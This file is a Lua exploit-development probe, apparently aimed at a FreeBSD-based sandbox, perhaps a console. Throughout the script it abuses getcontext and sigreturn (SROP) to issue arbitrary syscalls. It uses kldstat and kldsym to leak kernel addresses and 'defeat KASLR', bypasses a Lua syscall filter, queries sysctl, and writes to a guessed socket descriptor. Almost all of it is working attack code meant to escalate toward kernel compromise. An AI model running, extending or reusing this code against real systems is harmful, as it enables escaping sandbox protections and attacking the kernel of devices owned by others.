-- CRASH_CLASS: MODERATE
-- PROBE 130a: FOCUSED kldstat(308) + kldsym(309) via SROP
--
-- 128d confirmed arbitrary syscall via SROP but section D got cut off.
-- This probe ONLY does kldstat/kldsym to find kernel base.
-- If kldstat returns the kernel's load address → KASLR defeated.

print("=== PROBE 130a: SROP KLDSTAT/KLDSYM ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

local sc20 = make_syscall(20)
local sc_getcontext = make_syscall(421)
local sc_sigreturn = make_syscall(417)

local pid = to_num(sc20())
print("[0] pid=" .. pid)

local MC = 0x40
local RAX = MC + 0x38
local RDI = MC + 0x08
local RSI = MC + 0x10
local RDX = MC + 0x18
local RCX = MC + 0x20
local R8  = MC + 0x28
local R9  = MC + 0x30
local RIP = MC + 0xA0
local CTX_SIZE = 0x500

local function srop_call(syscall_num, arg1, arg2, arg3)
    local ctx = memory.alloc(CTX_SIZE)
    zero(ctx, CTX_SIZE)
    local ok_gc = pcall(function() return sc_getcontext(uint64(ctx)) end)
    if not ok_gc then return nil, "getcontext failed" end

    local rip_val = rq(ctx + RIP)
    local rh, rl = get_hi_lo(rip_val)
    local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

    wq(ctx + RIP, sc_addr)
    wq(ctx + RAX, uint64(syscall_num))
    if arg1 then wq(ctx + RDI, arg1) end
    if arg2 then wq(ctx + RSI, arg2) end
    if arg3 then wq(ctx + RDX, arg3) end

    local ok_sr, rv = pcall(function() return sc_sigreturn(uint64(ctx)) end)
    return rv, ok_sr
end

-- GPU mmap for output buffers
local sc_mmap = make_syscall(477)
local ok_mm, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x8000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("[0] gpu=" .. hex(gpu))

--------------------------------------------------------------------
-- SECTION A: kldstat(308) for kernel (fileid=1)
--------------------------------------------------------------------
print("")
print("--- SECTION A: kldstat(308) fileid=1 ---")

local kld_buf = gpu
zero(kld_buf, 0x200)
wd(kld_buf, 0x1A0)

local rv_kld = srop_call(308, uint64(1), kld_buf)
print("[A] kldstat rv=" .. hex(rv_kld))

local found_kptr = false
for off = 0, 0x1A0 - 4, 8 do
    local v = rq(kld_buf + off)
    if v then
        local h, l = get_hi_lo(v)
        if h ~= 0 or l ~= 0 then
            print(string.format("  +0x%03X: %s", off, hex(v)))
            if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                print("  *** KERNEL POINTER! ***")
                found_kptr = true
            end
        end
    end
end

if found_kptr then
    print("[A] *** KASLR DEFEATED! ***")
else
    print("[A] no kernel pointers in kldstat output")
end

--------------------------------------------------------------------
-- SECTION B: kldstat fileid=0..5 (try other modules)
--------------------------------------------------------------------
print("")
print("--- SECTION B: kldstat fileid sweep 0-5 ---")

for fid = 0, 5 do
    local buf = gpu + 0x200 * fid
    zero(buf, 0x200)
    wd(buf, 0x1A0)
    local rv = srop_call(308, uint64(fid), buf)
    local rh, rl = get_hi_lo(rv)
    local status = "unknown"
    if rl == 0 then status = "SUCCESS"
    elseif rl == 0xFFFFFFFF or rh == 0xFFFFFFFF then status = "FAIL"
    end
    print("[B] fileid=" .. fid .. " rv=" .. hex(rv) .. " (" .. status .. ")")

    if rl == 0 then
        for off = 0, 0x50, 8 do
            local v = rq(buf + off)
            if v then
                local vh, vl = get_hi_lo(v)
                if vh ~= 0 or vl ~= 0 then
                    print(string.format("    +0x%03X: %s", off, hex(v)))
                    if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                        print("    *** KERNEL POINTER! ***")
                    end
                end
            end
        end
    end
end

--------------------------------------------------------------------
-- SECTION C: kldsym(309) — kernel symbol lookup
--------------------------------------------------------------------
print("")
print("--- SECTION C: kldsym(309) ---")

local sym_buf = gpu + 0x1800
zero(sym_buf, 0x100)
wd(sym_buf, 0x20)  -- version

local name_buf = gpu + 0x1900
local names = {"printf", "copyin", "copyout", "malloc", "free"}

for _, name in ipairs(names) do
    zero(name_buf, 0x40)
    for i = 1, #name do
        pcall(function() memory.write_byte(name_buf + i - 1, string.byte(name, i)) end)
    end
    pcall(function() memory.write_byte(name_buf + #name, 0) end)

    zero(sym_buf, 0x30)
    wd(sym_buf, 0x20)
    wq(sym_buf + 8, name_buf)

    local rv = srop_call(309, uint64(0), uint64(1), sym_buf)
    local rh, rl = get_hi_lo(rv)
    print("[C] kldsym(\"" .. name .. "\"): rv=" .. hex(rv))

    if rl == 0 then
        local sym_val = rq(sym_buf + 0x10)
        local sym_size = rq(sym_buf + 0x18)
        if sym_val then
            local sh, sl = get_hi_lo(sym_val)
            print("  symvalue=" .. hex(sym_val) .. " symsize=" .. hex(sym_size))
            if sh >= 0xFFFF8000 and sh ~= 0xFFFFFFFF then
                print("  *** KERNEL SYMBOL! KASLR DEFEATED! ***")
            end
        end
    end
end

--------------------------------------------------------------------
-- SECTION D: pipe2(542) via SROP — bypass Lua filter
--------------------------------------------------------------------
print("")
print("--- SECTION D: pipe2(542) via SROP ---")

local pipe_buf = gpu + 0x1A00
zero(pipe_buf, 16)
local rv_pipe = srop_call(542, pipe_buf, uint64(0))
print("[D] pipe2: rv=" .. hex(rv_pipe))
local fd0 = rd(pipe_buf)
local fd1 = rd(pipe_buf + 4)
print("[D] fds: " .. tostring(fd0) .. ", " .. tostring(fd1))

--------------------------------------------------------------------
-- SECTION E: sysctl kern.proc.pathname via SROP
--------------------------------------------------------------------
print("")
print("--- SECTION E: sysctl kern.proc.pathname ---")

local mib = gpu + 0x1B00
zero(mib, 32)
wd(mib, 1)        -- CTL_KERN
wd(mib + 4, 14)   -- KERN_PROC
wd(mib + 8, 12)   -- KERN_PROC_PATHNAME
wd(mib + 12, -1)  -- current process

local outbuf = gpu + 0x1C00
zero(outbuf, 0x400)
local oldlenp = gpu + 0x1B20
wq(oldlenp, uint64(0x400))

local rv_sc = srop_call(202, uint64(mib), uint64(4), outbuf)
print("[E] sysctl: rv=" .. hex(rv_sc))

local path = ""
for i = 0, 0xFF do
    local b = rd(outbuf + i)
    if b == nil or b == 0 then break end
    if b >= 32 and b < 127 then
        path = path .. string.char(b)
    end
end
if #path > 0 then
    print("[E] pathname: " .. path)
end

--------------------------------------------------------------------
-- SECTION F: Try direct kernel memory read via SROP mmap
-- mmap with MAP_FIXED at a kernel-ish VA → will fail but try
--------------------------------------------------------------------
print("")
print("--- SECTION F: writev(121) to socket via SROP ---")

-- Use writev to write our PID to the socket (fd=4 is typical for TCP)
local iov = gpu + 0x2000
local msg = gpu + 0x2100
zero(iov, 32)
zero(msg, 32)

-- Write a marker string
local marker = "[SROP_WRITEV_OK]"
for i = 1, #marker do
    pcall(function() memory.write_byte(msg + i - 1, string.byte(marker, i)) end)
end
pcall(function() memory.write_byte(msg + #marker, 0x0A) end) -- newline

wq(iov, msg)                      -- iov_base
wq(iov + 8, uint64(#marker + 1))  -- iov_len

-- Try fd=4 (typical TCP socket fd)
local rv_wv = srop_call(121, uint64(4), iov, uint64(1))
print("[F] writev(4): rv=" .. hex(rv_wv))

print("")
print("[FINAL] pid=" .. to_num(sc20()))
print("=== PROBE 130a COMPLETE ===")
